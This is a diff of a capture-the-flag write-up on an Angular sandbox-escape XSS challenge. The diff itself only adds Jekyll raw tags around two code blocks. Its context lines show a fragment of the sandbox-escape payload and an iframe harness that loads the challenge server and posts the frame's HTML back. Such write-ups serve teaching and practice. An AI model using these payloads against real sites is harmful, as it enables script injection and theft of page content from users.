@@ -77,6 +77,7 @@ a=toString().constructor.prototype;a.charAt=a.trim;$eval(toString().constructor.
 
 To test the script locally, download the vulnerable Angular source code from the challenge website and place it in a `javascripts` folder. Next, create an `index.html` page in the root folder
 ```html
+{% raw %}
 <html>
   <iframe id="xss"></iframe>
 </html>
@@ -92,6 +93,7 @@ To test the script locally, download the vulnerable Angular source code from the
   },
   1000)
 </script>
+{% endraw %}
 ```
 The result should be something like this:
 
@@ -115,6 +117,7 @@ The following picture should be the outcome:
 To make sure the exploit works for the server, add an `onload` function to inject to run `postMessage(frame.outerHTML)` and change inject.src to `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts`. 
 
 ```html
+{% raw %}
 <html>
 	<iframe id="xss"></iframe>
 </html>
@@ -132,6 +135,7 @@ To make sure the exploit works for the server, add an `onload` function to injec
 	inject.src = "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts"
 
 </script>
+{% endraw %}
 ```
 
 Hosting it locally and accessing it, you will realize that the page still did not work. No JavaScript alert ☹
